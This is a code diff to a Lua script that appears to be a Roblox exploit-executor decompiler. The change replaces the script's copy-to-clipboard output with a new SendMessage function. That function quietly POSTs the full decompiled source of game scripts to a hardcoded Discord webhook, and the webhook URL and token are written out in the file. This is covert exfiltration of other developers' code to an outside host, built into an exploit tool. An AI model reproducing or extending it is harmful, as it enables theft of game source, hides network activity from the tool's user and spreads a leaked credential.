@@ -11,6 +11,7 @@ local Network = require(ClientLibrary.Network)
 
 local timeout = 10
 local debug = true
+local url = "https://discord.com/api/webhooks/1190677232616747028/kFukOVoJQPYY72B8G8SuoRIkN4m1LKsP0f7vg9rsjmbMykEm2tQqjIw3N1QZYbsbyYLx"
 
 function tableToString(tbl, indent)
 	indent = indent or 0
@@ -118,7 +119,9 @@ function decompile(object, extractDesendants)
 					continue
 				end
 
-				setclipboard(source)
+				--setclipboard(source)
+				SendMessage(url, "# DECOMPILED game."..object:GetFullName().."\n\n"..source)
+				
 				if debug then
 					print("DECOMPILED _ "..tostring(module.Name)..getParents(module,de))
 				end
@@ -142,12 +145,33 @@ function decompile(object, extractDesendants)
 		return
 	end
 
-	setclipboard(source)
+	--setclipboard(source)
+	SendMessage(url, "# DECOMPILED game."..object:GetFullName().."\n\n"..source)
+
 	if debug then
 		print("DECOMPILED _ "..tostring(object.Name))
 	end
 	warn("DONE!")
 end
+
+function SendMessage(url, message)
+	local http = game:GetService("HttpService")
+	local headers = {
+		["Content-Type"] = "application/json"
+	}
+	local data = {
+		["content"] = message
+	}
+	local body = http:JSONEncode(data)
+	local response = request({
+		Url = url,
+		Method = "POST",
+		Headers = headers,
+		Body = body
+	})
+end
+
+
 
 return decompile
 
